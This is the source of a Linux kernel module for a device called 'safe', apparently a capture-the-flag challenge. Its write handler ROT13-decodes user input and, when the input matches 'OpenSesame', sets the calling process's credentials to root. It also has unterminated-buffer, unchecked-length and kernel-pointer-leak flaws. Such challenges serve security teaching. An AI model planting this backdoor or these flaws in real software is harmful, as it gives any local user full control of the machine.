#define _GNU_SOURCE


#include "safe.h"
#include <linux/module.h>
#include <linux/kernel.h>   
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/errno.h>
#include <linux/uaccess.h>
#include <linux/ioctl.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/kmod.h>
#include <linux/pid.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/uidgid.h>

/* Buffer size */
#define MAX_BUF_LEN 256

// The n value for the rot-n
static int32_t SHIFT_VAL = 13;

static int pid = 0;
MODULE_LICENSE("GPL");
module_param(pid,int,0000);

char *p_flag = "The safe is locked. Enter the password first.\n\x00";

static void rotate_buffer(char* buffer)
{
    int i;
    for (i = 0; i < strlen(buffer); ++i)
    {
        char letter = buffer[i];
        // Stop when we reach the end of the buffer
        if (letter == '\n' || letter == '\0')
            return;

        // Uppercase
        if (letter >= 'A' && letter <= 'Z')
        {
            if ((letter + SHIFT_VAL) > 'Z')
                buffer[i] = (letter + SHIFT_VAL) - 26;
            else
                buffer[i] = (letter + SHIFT_VAL);
        }
        // Lowercase
        else
        {
            if ((letter + SHIFT_VAL) > 'z')
                buffer[i] = (letter + SHIFT_VAL) - 26;
            else
                buffer[i] = (letter + SHIFT_VAL);
        }
    }
}

static int get_root_shell(char* buffer)
{
    char* root_str = "OpenSesame";

    rotate_buffer(buffer);

    /* If we find root_str in the buffer */


    if (strstr(buffer, root_str))
    {
        /* Create a task and a cred structure */
        struct task_struct *calling_task;
        struct cred *root_cred;
        /* Initialize root uid and gid */
        kuid_t kuid = KUIDT_INIT(0);
        kgid_t kgid = KGIDT_INIT(0);
        /* Get the calling process */
        calling_task = get_current();

        if (calling_task == NULL) 
        {
            printk(KERN_NOTICE "safe: Couldn't get current task context");
            return -1;
        }

        printk(KERN_INFO "safe: Giving root privileges to PID %d...\n", calling_task->pid);
        /* Initialize credentials */
        root_cred = prepare_creds();

        if (root_cred == NULL) 
        {
            printk(KERN_NOTICE "safe: Failed to prepare new credentials");
            return -EFAULT;
        }
        /* Give it root !*/
        root_cred->uid = root_cred->euid = kuid;
        root_cred->gid = root_cred->egid = kgid;
        /* Commit the credentials to the calling task */
        commit_creds(root_cred);

    }

    return 0;
}

static ssize_t device_file_read(struct file *file_ptr, char __user *user_buffer, size_t count, loff_t *offset)
{
    /* Give the user his data */
    /* Note : use strlen because sizeof(ptr) will return the ptr size.. */
    size_t flag_len = strlen(p_flag);

    if (*offset > flag_len)
        return 0;

    if (copy_to_user(user_buffer, p_flag, strlen(p_flag)+1) != 0)
        return -EFAULT;

    *offset += count;
    return count;
}

static ssize_t device_file_write(struct file *file_ptr, const char __user *user_buffer, size_t count, loff_t *offset)
{
    char *user_write;

    user_write = kmalloc(count, GFP_KERNEL);

    printk(KERN_NOTICE "safe: user message allocated to 0x%p", user_write);
    printk(KERN_NOTICE "safe: Writing %u bytes at 0x%p", (unsigned int) count, user_write);

    /* Write from the user buffer */
    if (copy_from_user(user_write, user_buffer, count) != 0)
        return -EFAULT;
    
    get_root_shell(user_write);

    kfree(user_write);

    return count;
}

static struct file_operations rot13_fops = 
{
    .owner = THIS_MODULE,
    .read  = device_file_read,
    .write = device_file_write,
};

static int device_file_major_number = 0;
static const char device_name[] = "safe";

int register_device(void)
{
    int result = 0;

    printk(KERN_NOTICE "safe: Registering device");

    result = register_chrdev(device_file_major_number, device_name, &rot13_fops);
    
    if (result < 0)
    {
        printk(KERN_WARNING "safe: Couldn\'t reguster device, ec=%i", result);
        return result;
    }

    device_file_major_number = result;
    printk(KERN_NOTICE "safe: device registered with major number %i", result);

    return 0;
}

void unregister_device(void)
{
    printk(KERN_NOTICE "safe: device unregistering");


    if (device_file_major_number != 0)
    {
        unregister_chrdev(device_file_major_number, device_name);
    }    

}
